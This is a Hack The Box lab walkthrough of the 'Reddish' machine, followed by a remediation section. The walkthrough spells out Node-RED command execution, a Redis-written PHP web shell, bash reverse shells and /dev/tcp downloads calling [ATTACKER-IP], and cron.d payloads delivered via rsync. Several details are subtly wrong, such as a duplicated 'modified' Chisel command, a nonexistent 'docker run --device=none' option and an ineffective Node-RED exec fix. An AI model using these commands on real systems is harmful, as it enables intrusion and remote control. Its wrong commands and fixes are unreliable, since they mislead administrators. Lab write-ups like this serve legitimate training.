---
title: "Reddish HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T09:15:00Z
tags: ["insane-linux", "node-red", "docker", "pivoting", "chisel", "redis", "web", "rsync", "cron", "privilege-escalation", "network-tunneling", "containers"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Reddish HTB machine featuring Node-RED exploitation, Docker container pivoting with Chisel tunneling, Redis database manipulation, rsync wildcard exploitation, and multi-hop privilege escalation through containerized environments"
---

# Reddish HTB - Insane Linux Box Walkthrough

{{< youtube Yp4oxoQIBAM >}}

## Key Exploitation Steps and Techniques (Chronological Order)

Below is a chronological extraction of the key exploitation steps and techniques used in the provided data for the "Reddish" box from Hack The Box, focusing on the process of gaining access and escalating privileges through multiple hops and pivoting techniques.

---

### Key Exploitation Steps and Techniques (Chronological Order)

1. **Initial Reconnaissance with Nmap (Port Scanning)**
   - **Technique**: Perform an Nmap scan to identify open ports and services on the target IP ([TARGET-IP]).
   - **Steps**:
     - Run a default Nmap scan: `nmap -sC -sV -oA nmap/reddish [TARGET-IP]`. No open ports found in the top 1000.
     - Conduct a full port scan: `nmap -p- -T5 --max-retries 0 -v -oA nmap/allports-reddish [TARGET-IP]`. Discovered port 1880 open.
     - Perform a targeted scan on port 1880: `nmap -p 1880 -sC -sV -oA nmap/targeted1880-reddish [TARGET-IP]`. Identified HTTP service running Node.js Express framework.
   - **Purpose**: Identify open ports, services, and potential OS (Linux, based on TTL 63 from ping).

2. **Web Enumeration and Application Identification**
   - **Technique**: Manual web enumeration and favicon analysis to identify the application.
   - **Steps**:
     - Access `http://[TARGET-IP]:1880`, received "Cannot GET /" response.
     - Check favicon (`/favicon.ico`), download it, and use Google Image Search to identify the application as Node-RED (a flow-based programming tool).
   - **Purpose**: Confirm the application running on port 1880 is Node-RED, a platform that may allow command execution.

3. **Exploiting Node-RED for Initial Shell**
   - **Technique**: Use Burp Suite to manipulate HTTP requests and Node-RED's functionality to achieve command execution.
   - **Steps**:
     - Send a POST request to `/red/<ID>` (ID obtained from Burp Suite response) to access the Node-RED interface.
     - Create a flow in Node-RED with an `exec` node to run commands (e.g., `whoami`), but no output received.
     - Configure a TCP output node to connect to attacker's machine ([ATTACKER-IP]:4444) and send command output.
     - Use `netcat` to receive output, achieving a pseudo-shell: `nc -lvnp 4444`. Commands like `ls` and `cd` executed successfully.
   - **Purpose**: Gain initial command execution on the Node-RED container.

4. **Privilege Escalation Attempt via LinEnum Script**
   - **Technique**: Transfer and execute a LinEnum script to enumerate the system for privilege escalation opportunities.
   - **Steps**:
     - Attempt to transfer LinEnum via `wget` or `curl` to `[ATTACKER-IP]:8000`, but tools were unavailable.
     - Use `bash -c "cat </dev/tcp/[ATTACKER-IP]/8000" > lin.sh` to transfer the script via `/dev/tcp`.
     - Execute `bash lin.sh` to enumerate the system, revealing it's a Docker container (confirmed by `/dockerenv` file) and identifying readable `/etc/shadow` with no passwords.
   - **Purpose**: Gather system information to identify potential privilege escalation vectors.

5. **Network Enumeration and Pivoting Preparation**
   - **Technique**: Enumerate internal network IPs and scan for other containers.
   - **Steps**:
     - Run `ip addr` to identify local IP (172.18.0.2) and assume other IPs in the 172.18.0.0/16 and 172.19.0.0/16 subnets.
     - Create a bash script (`ip_scan.sh`) to ping IPs in 172.18.0.0/16: `for ip in $(seq 1 255); do ping -c 1 172.18.0.$ip >/dev/null && echo "online 172.18.0.$ip"; done`. Identified 172.18.0.1 (gateway) and 172.18.0.2 (current container).
     - Scan 172.19.0.0/16 subnet, identifying 172.19.0.2, 172.19.0.3, and 172.19.0.4 as active.
     - Perform a port scan on 172.19.0.3 using a bash script: `for port in {20,21,22,80,443,8080,8443}; do echo "test" > /dev/tcp/172.19.0.3/$port 2>/dev/null && echo "open port $port"; done`. Found port 80 open.
   - **Purpose**: Discover additional containers for pivoting.

6. **Pivoting with Chisel (Reverse Tunnel to Web Server)**
   - **Technique**: Use Chisel to create a reverse tunnel to access the web server on 172.19.0.3:80.
   - **Steps**:
     - Build and optimize Chisel binary on the attacker's machine: `go build -ldflags "-s -w"` and `upx --brute chisel` to reduce size.
     - Transfer Chisel to the Node-RED container via `nc -lvnp 80` and `cat </dev/tcp/[ATTACKER-IP]/80 > chisel`.
     - Set up Chisel server on attacker's machine: `./chisel server -p 8000 --reverse`.
     - On Node-RED container, run Chisel client: `./chisel client [ATTACKER-IP]:8000 R:127.0.0.1:8001:172.19.0.3:80`.
     - Access `http://localhost:8001` on attacker's machine to reach the web server on 172.19.0.3.
     - Modify to bind to localhost for security: `./chisel client [ATTACKER-IP]:8000 R:127.0.0.1:8001:172.19.0.3:80`.
   - **Purpose**: Establish a tunnel to access the web server on the second container.

7. **Web Server Exploitation (Code Execution)**
   - **Technique**: Exploit shared web folder with Redis database to achieve code execution.
   - **Steps**:
     - Access `http://localhost:8001`, identify endpoints like `/getData` (returns hit counter) and `/incrementCounter`.
     - Discover Redis on 172.19.0.2:6379 (no authentication required) via port scan and Nmap: `nmap -sT -p 6379 -sC -sV localhost`.
     - Use Redis to write a PHP file to the shared web directory:
       - `FLUSHALL` to clear Redis.
       - `SET please_subscribe "<?php system(\$_REQUEST['cmd']); ?>"`.
       - `CONFIG SET dbfilename apsec.php`.
       - `CONFIG SET dir /var/www/html`.
       - `SAVE` to write the file.
     - Access `http://localhost:8001/apsec.php?cmd=whoami`, confirming code execution as `www-data`.
   - **Purpose**: Gain code execution on the web server container.

8. **Reverse Shell from Web Server**
   - **Technique**: Set up a local pivot to allow the web server to send a reverse shell to the attacker's machine.
   - **Steps**:
     - Set up Chisel server on attacker's machine: `./chisel server -p 8000`.
     - On Node-RED container, run: `./chisel client [ATTACKER-IP]:8000 9001:127.0.0.1:8005`.
     - On attacker's machine, listen: `nc -lvnp 8005`.
     - From Burp Suite, execute: `bash -c 'bash -i >& /dev/tcp/172.19.0.4/9001 0>&1'` via `apsec.php`.
     - Receive reverse shell as `www-data` on the web server container.
   - **Purpose**: Obtain a stable shell on the web server container.

9. **Privilege Escalation on Web Server via Rsync (Cron Job Abuse)**
   - **Technique**: Exploit a cron job running `rsync` with a wildcard to execute arbitrary commands.
   - **Steps**:
     - Identify `/backup/backup.sh` running every 3 minutes via `/etc/cron.d/backup`.
     - Exploit `rsync` wildcard vulnerability by creating a file named `--e sh please_subscribe.o.db` in `/var/www/html`.
     - Create `/bin/sh` copy with setuid: `cp /bin/sh /tmp/priv; chmod 4755 /tmp/priv`.
     - Transfer file via `rsync`: `rsync -av /tmp/please_subscribe.o.db rsync://backup:873/src/etc/cron.d/`.
     - Wait for cron job to execute, granting a setuid binary (`/tmp/priv`).
     - Run `/tmp/priv` to gain root on the web server container.
   - **Purpose**: Escalate privileges to root on the web server container.

10. **Accessing Backup Server**
    - **Technique**: Use `rsync` to access files on the backup server (172.20.0.2).
    - **Steps**:
      - From the root shell, use `rsync -av rsync://backup:873/src/etc/shadow` to retrieve files.
      - Attempt to access `root.txt`, but it's not present.
    - **Purpose**: Attempt to retrieve sensitive files from the backup server.

11. **Pivoting to Backup Server (Chained Tunnels)**
    - **Technique**: Set up chained Chisel tunnels to allow the backup server to connect back to the attacker's machine.
    - **Steps**:
      - On attacker's machine: `./chisel server -p 8000`.
      - On Node-RED container: `./chisel client [ATTACKER-IP]:8000 8010:127.0.0.1:8000`.
      - On web server container: `./chisel client 172.19.0.4:8010 8020:127.0.0.1:9005`.
      - Transfer a base64-encoded reverse shell script (`runme`) to the backup server via `rsync`: `rsync -avP /tmp/clean rsync://backup:873/src/etc/cron.d/clean`.
      - Script content: `echo "base64_encoded_shell" | base64 -d | bash`, connecting to 172.20.0.3:8020.
      - Receive root shell on the backup server via `nc -lvnp 9005`.
    - **Purpose**: Gain root access on the backup server.

12. **Final Root Access and Flag Retrieval**
    - **Technique**: Mount disk and enumerate for the final flag.
    - **Steps**:
      - On the backup server, run `ip addr` to confirm IP (172.20.0.2).
      - Transfer LinEnum via `nc -lvnp 9006` and `cat </dev/tcp/172.20.0.3/8021 > lin.sh`.
      - Mount disks: `mount /dev/sda1 /tmp/sda1`, revealing `/root/root.txt`.
      - Read `root.txt` (33 characters).
      - Set up a final reverse shell to the main host (not a Docker container):
        - Create base64-encoded shell script: `echo "bash -i >& /dev/tcp/[ATTACKER-IP]/101 0>&1" | base64`.
        - Transfer and execute via `rsync` to `/etc/cron.d`.
        - Receive shell on `nc -lvnp 101`, confirming root access on the main host.
      - Run `python -c 'import pty;pty.spawn("/bin/bash")'` for a stable shell.
    - **Purpose**: Retrieve the final `root.txt` flag and gain full root access.

13. **Optional: SOCKS Proxy for Easier Pivoting**
    - **Technique**: Use Chisel to create a SOCKS5 proxy for dynamic routing.
    - **Steps**:
      - On attacker's machine: `./chisel server -p 8000 --reverse`.
      - On Node-RED container: `./chisel client [ATTACKER-IP]:8000 R:127.0.0.1:8001:127.0.0.1:1337`.
      - On Node-RED container, run a second Chisel: `./chisel server -p 1337 --socks5`.
      - On attacker's machine: `./chisel client 127.0.0.1:8001 socks`.
      - Use `proxychains` with `nmap` or `curl` to access internal IPs (e.g., `proxychains nmap -sT 172.19.0.3 -p 80`).
    - **Purpose**: Simplify access to multiple internal IPs without creating individual tunnels.

---

### Summary
The exploitation process involves:
- **Initial Access**: Nmap scanning and favicon analysis to identify Node-RED on port 1880, followed by command execution via HTTP POST requests.
- **Pivoting**: Using Chisel for reverse and local tunnels to access internal containers (web server and Redis on 172.19.0.2/3).
- **Code Execution**: Exploiting Redis to write a PHP file for a web shell, then upgrading to a reverse shell.
- **Privilege Escalation**: Abusing a cron job with `rsync` to gain root on the web server container.
- **Further Pivoting**: Chained Chisel tunnels to access the backup server, followed by another `rsync` exploit for root access.
- **Final Access**: Mounting disks to retrieve `root.txt` and establishing a root shell on the main host.

This sequence demonstrates advanced pivoting techniques using Chisel, exploitation of Node-RED and Redis, and cron job abuse with `rsync` to achieve full system compromise across multiple Docker containers.

## Security Gaps and Remediation

Below is a detailed analysis of the security gaps identified in the services and systems exploited in the "Reddish" Hack The Box scenario, along with specific recommendations for fixing these issues through source code or configuration changes. The gaps are organized by the services or systems involved (Node-RED, web server, Redis, rsync, Docker, and general network configuration) and include actionable fixes to mitigate the vulnerabilities.

---

### 1. Node-RED (Running on Port 1880)
**Gaps and Fixes**:

- **Gap 1: Unauthenticated Access to Node-RED Interface**
  - **Description**: The Node-RED instance allows unauthenticated access to its web interface, enabling attackers to create flows and execute commands via the `exec` node.
  - **Impact**: Attackers can achieve arbitrary command execution on the host container.
  - **Fix (Configuration)**:
    - Enable authentication in Node-RED by configuring the `settings.js` file (typically located in `~/.node-red/settings.js`).
      - Set `adminAuth` to use a username/password or token-based authentication:
        ```javascript
        adminAuth: {
          type: "credentials",
          users: [{
            username: "admin",
            password: "$2a$08$...", // Use bcrypt to hash password
            permissions: "*"
          }]
        }
        ```
      - Restart Node-RED to apply changes.
    - Restrict access to the Node-RED admin interface by binding it to localhost or a specific IP, or use a firewall rule (e.g., `iptables -A INPUT -p tcp --dport 1880 -s 127.0.0.1 -j ACCEPT`).
  - **Fix (Source Code)**:
    - If custom Node-RED nodes are used, ensure they enforce authentication checks before allowing flow modifications or command execution.

- **Gap 2: Exposed HTTP Endpoint Allowing Command Execution**
  - **Description**: The `/red/<ID>` endpoint accepts POST requests that allow command execution through flow manipulation without validation.
  - **Impact**: Attackers can manipulate flows to run arbitrary commands (e.g., via `exec` node).
  - **Fix (Configuration)**:
    - Disable or restrict the `exec` node in Node-RED's configuration to prevent command execution:
      - In `settings.js`, disable unsafe nodes:
        ```javascript
        functionGlobalContext: {
          os: null // Disable os module to prevent exec node usage
        }
        ```
    - Use Node-RED's `node-red-contrib-acl` or similar access control plugins to restrict flow modifications to authorized users.
  - **Fix (Source Code)**:
    - Modify Node-RED source code to enforce input validation and sanitization for flow configurations, ensuring only approved commands or nodes can be executed.
    - Implement a whitelist for allowed nodes and reject any flows containing `exec` or similar nodes unless explicitly permitted.

- **Gap 3: Exposed Favicon Revealing Application Identity**
  - **Description**: The favicon (`/favicon.ico`) leaks the Node-RED application identity, aiding attackers in targeting known vulnerabilities.
  - **Impact**: Simplifies reconnaissance by confirming the application type.
  - **Fix (Configuration)**:
    - Replace the default favicon with a generic or custom icon to avoid leaking application details.
    - Disable favicon serving in Node-RED's HTTP server configuration or use a reverse proxy (e.g., Nginx) to filter such requests:
      ```nginx
      location /favicon.ico {
        return 404;
      }
      ```
  - **Fix (Source Code)**:
    - Modify Node-RED's HTTP server to not serve identifiable assets like the default favicon unless explicitly configured.

---

### 2. Web Server (Running on 172.19.0.3:80)
**Gaps and Fixes**:

- **Gap 1: Shared Directory with Redis Allowing File Writes**
  - **Description**: The web server's document root (`/var/www/html`) is shared with the Redis database, allowing Redis to write executable PHP files (e.g., `apsec.php`) to the web root.
  - **Impact**: Attackers can achieve code execution by writing malicious PHP scripts via Redis.
  - **Fix (Configuration)**:
    - Isolate Redis and web server directories by ensuring they do not share a common filesystem or mount point.
    - Configure Redis to write database files to a non-web-accessible directory:
      - In `redis.conf`, set `dir` to a restricted path:
        ```conf
        dir /var/lib/redis/
        ```
      - Ensure `/var/lib/redis/` is not accessible to the web server user (`www-data`).
    - Restrict web server write permissions: `chown root:root /var/www/html; chmod 755 /var/www/html`.
  - **Fix (Source Code)**:
    - If the web application interacts with Redis, implement strict validation to prevent arbitrary file writes.
    - Sanitize Redis commands to disallow `CONFIG SET` operations that modify `dbfilename` or `dir`.

- **Gap 2: PHP Execution Without Input Validation**
  - **Description**: The web server executes PHP files (e.g., `apsec.php?cmd=whoami`) without validating or sanitizing user input.
  - **Impact**: Allows arbitrary command execution via URL parameters.
  - **Fix (Configuration)**:
    - Disable PHP execution in the web root by using a `.htaccess` file (for Apache):
      ```apache
      php_flag engine off
      ```
      Or for Nginx, block PHP file execution:
      ```nginx
      location ~ \.php$ {
        deny all;
      }
      ```
    - If PHP is required, use a whitelist for allowed scripts and disable direct access to user-uploaded files.
  - **Fix (Source Code)**:
    - Modify PHP scripts to sanitize and validate `$_REQUEST['cmd']` using a whitelist of allowed commands or disable `system()` calls entirely:
      ```php
      $allowed_commands = ['whoami', 'id'];
      if (in_array($_REQUEST['cmd'], $allowed_commands)) {
        system(escapeshellcmd($_REQUEST['cmd']));
      } else {
        die("Invalid command");
      }
      ```

---

### 3. Redis (Running on 172.19.0.2:6379)
**Gaps and Fixes**:

- **Gap 1: No Authentication Required**
  - **Description**: Redis runs without authentication, allowing unauthenticated clients to execute commands like `FLUSHALL`, `SET`, and `CONFIG SET`.
  - **Impact**: Attackers can manipulate Redis to write malicious files or clear data.
  - **Fix (Configuration)**:
    - Enable Redis authentication by setting a password in `redis.conf`:
      ```conf
      requirepass strong_password_here
      ```
      - Restart Redis to apply changes.
    - Bind Redis to localhost or a specific IP: `bind 127.0.0.1` in `redis.conf`.
    - Use a firewall to restrict access: `iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT; iptables -A INPUT -p tcp --dport 6379 -j DROP`.
  - **Fix (Source Code)**:
    - If Redis is used in a custom application, enforce client-side authentication checks before allowing connections.

- **Gap 2: Ability to Modify Configuration (CONFIG SET)**
  - **Description**: Redis allows `CONFIG SET` commands to change `dbfilename` and `dir`, enabling file writes to arbitrary locations.
  - **Impact**: Attackers can write executable files to the web server's document root.
  - **Fix (Configuration)**:
    - Disable dangerous commands in `redis.conf`:
      ```conf
      rename-command CONFIG ""
      rename-command FLUSHALL ""
      ```
    - Run Redis as a non-privileged user and restrict its write permissions to a specific directory: `chown redis:redis /var/lib/redis; chmod 700 /var/lib/redis`.
  - **Fix (Source Code)**:
    - If a custom application uses Redis, implement a wrapper to block `CONFIG` and `FLUSHALL` commands unless explicitly needed.

---

### 4. Rsync (Running on Backup Server, 172.20.0.2:873)
**Gaps and Fixes**:

- **Gap 1: Unauthenticated Rsync Access**
  - **Description**: The rsync service allows unauthenticated access to write files to `/src/etc/cron.d/`, which is executed by a cron job.
  - **Impact**: Attackers can upload malicious scripts to gain root access.
  - **Fix (Configuration)**:
    - Enable authentication in the rsync configuration (`/etc/rsyncd.conf`):
      ```conf
      auth users = backup_user
      secrets file = /etc/rsyncd.secrets
      ```
      - Create `/etc/rsyncd.secrets` with `backup_user:strong_password` and set permissions: `chmod 600 /etc/rsyncd.secrets`.
    - Restrict rsync modules to read-only or specific directories:
      ```conf
      [src]
      path = /src/etc/cron.d/
      read only = yes
      ```
    - Use a firewall to limit rsync access: `iptables -A INPUT -p tcp --dport 873 -s 172.20.0.0/24 -j ACCEPT; iptables -A INPUT -p tcp --dport 873 -j DROP`.
  - **Fix (Source Code)**:
    - If rsync is part of a custom application, enforce user authentication and validate file uploads to prevent arbitrary writes.

- **Gap 2: Cron Job Executing Rsync with Wildcard**
  - **Description**: The cron job (`/backup/backup.sh`) uses `rsync` with a wildcard (`*.o.db`), allowing attackers to inject commands via specially crafted filenames (e.g., `--e sh please_subscribe.o.db`).
  - **Impact**: Leads to arbitrary command execution as root.
  - **Fix (Configuration)**:
    - Modify the cron job to avoid wildcards and explicitly list files to sync:
      ```bash
      rsync -av /specific/file.o.db rsync://backup:873/src/etc/cron.d/
      ```
    - Run the cron job as a non-root user with minimal permissions.
    - Validate filenames in the rsync destination directory before execution:
      ```bash
      for file in /src/etc/cron.d/*.o.db; do
        if [[ ! "$file" =~ ^[a-zA-Z0-9_\.]+$ ]]; then
          echo "Invalid filename: $file" >&2
          continue
        fi
        # Process file
      done
      ```
  - **Fix (Source Code)**:
    - If rsync is scripted, implement strict filename validation to reject files containing special characters like `--`.

---

### 5. Docker Containers
**Gaps and Fixes**:

- **Gap 1: Overprivileged Containers**
  - **Description**: Docker containers (Node-RED, web server, backup server) run with excessive privileges, allowing access to sensitive files (e.g., `/etc/shadow`) and enabling privilege escalation.
  - **Impact**: Attackers can escalate to root within containers or access host resources.
  - **Fix (Configuration)**:
    - Run containers with least privilege using Docker's security options:
      ```bash
      docker run --user 1000:1000 --cap-drop=ALL --cap-add=NET_BIND_SERVICE node-red
      ```
    - Use a non-root user inside containers and avoid mounting sensitive host directories.
    - Enable Docker's user namespace mapping to isolate container UIDs from the host.
  - **Fix (Source Code)**:
    - If custom container images are used, ensure the Dockerfile specifies a non-root user:
      ```dockerfile
      USER node-red
      ```

- **Gap 2: Exposed Network Interfaces**
  - **Description**: Containers expose internal network interfaces (e.g., 172.18.0.0/16, 172.19.0.0/16) without isolation, allowing lateral movement.
  - **Impact**: Attackers can scan and pivot to other containers.
  - **Fix (Configuration)**:
    - Use Docker's network isolation to place containers in separate networks:
      ```bash
      docker network create --driver bridge isolated_net
      docker run --network isolated_net node-red
      ```
    - Implement network policies to restrict inter-container communication:
      ```bash
      docker network create --internal internal_net
      ```
    - Use a firewall to block unauthorized access between containers: `iptables -A FORWARD -s 172.18.0.0/16 -d 172.19.0.0/16 -j DROP`.
  - **Fix (Source Code)**:
    - If a custom application manages Docker, enforce network segmentation in the orchestration logic.

- **Gap 3: Mounted Host Disks in Backup Container**
  - **Description**: The backup container mounts host disks (e.g., `/dev/sda1`), exposing sensitive files like `/root/root.txt`.
  - **Impact**: Attackers with root in the container can access host files.
  - **Fix (Configuration)**:
    - Avoid mounting host devices in containers:
      ```bash
      docker run --device=none backup_image
      ```
    - If disk access is required, use read-only mounts:
      ```bash
      docker run --device=/dev/sda1:ro backup_image
      ```
    - Restrict container access to specific filesystems using AppArmor or SELinux profiles.
  - **Fix (Source Code)**:
    - If the backup application requires disk access, implement strict path validation to prevent access to sensitive directories like `/root`.

---

### 6. General Network Configuration
**Gaps and Fixes**:

- **Gap 1: Exposed Services Without Firewall**
  - **Description**: Services like Node-RED (1880), Redis (6379), and rsync (873) are accessible from external or internal networks without restrictions.
  - **Impact**: Attackers can directly target these services for exploitation.
  - **Fix (Configuration)**:
    - Implement host-based firewall rules to restrict access:
      ```bash
      iptables -A INPUT -p tcp --dport 1880 -s 127.0.0.1 -j ACCEPT
      iptables -A INPUT -p tcp --dport 6379 -s 172.19.0.0/24 -j ACCEPT
      iptables -A INPUT -p tcp --dport 873 -s 172.20.0.0/24 -j ACCEPT
      iptables -A INPUT -j DROP
      ```
    - Use a reverse proxy (e.g., Nginx) to control access to web services and enforce authentication.
  - **Fix (Source Code)**:
    - If services are part of a custom application, implement IP-based access controls within the application logic.

- **Gap 2: Lack of Network Segmentation**
  - **Description**: Containers and the host share overlapping network namespaces (e.g., 172.18.0.0/16, 172.19.0.0/16, 172.20.0.0/16), allowing unrestricted communication.
  - **Impact**: Facilitates lateral movement between containers.
  - **Fix (Configuration)**:
    - Use Docker's bridge or overlay networks to segment containers:
      ```bash
      docker network create --subnet=172.18.0.0/24 node_red_net
      docker network create --subnet=172.19.0.0/24 web_net
      ```
    - Configure routing to allow only necessary traffic between networks.
  - **Fix (Source Code)**:
    - If a custom orchestration tool is used, enforce strict network policies in the application logic.

- **Gap 3: Insecure File Transfer Mechanisms**
  - **Description**: The use of `netcat` and `/dev/tcp` for file transfers lacks encryption and authentication.
  - **Impact**: Attackers can intercept or manipulate transferred files.
  - **Fix (Configuration)**:
    - Use secure file transfer protocols like SCP or SFTP:
      ```bash
      scp file user@host:/path
      ```
    - If `netcat` is required, use encryption (e.g., `openssl` for TLS):
      ```bash
      openssl s_server -quiet -key key.pem -cert cert.pem -port 8000
      ```
  - **Fix (Source Code)**:
    - Implement secure file transfer libraries (e.g., `paramiko` in Python) in custom applications.

---

### Summary of Fixes
- **Node-RED**: Enable authentication, disable `exec` node, and obscure application identity.
- **Web Server**: Isolate shared directories, disable PHP execution or sanitize inputs.
- **Redis**: Require authentication, disable dangerous commands, and restrict access.
- **Rsync**: Enforce authentication, avoid wildcards in cron jobs, and validate filenames.
- **Docker**: Run containers with minimal privileges, isolate networks, and avoid mounting host disks.
- **Network**: Use firewalls, segment networks, and secure file transfers.

Implementing these configuration and source code fixes will significantly enhance the security of the systems and services, preventing the exploitation techniques used in the "Reddish" scenario.

## Conclusion

Reddish is an excellent machine that demonstrates the complexity of containerized environments and the advanced pivoting techniques required in modern penetration testing. It requires expertise in:
- Node-RED flow-based programming exploitation
- Advanced network pivoting with tools like Chisel
- Redis database manipulation and configuration abuse
- Docker container security and inter-container communication
- Rsync wildcard exploitation and cron job abuse
- Multi-hop privilege escalation through containerized environments

The machine emphasizes the importance of proper container security, network segmentation, service authentication, and the principle of least privilege across containerized infrastructures.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*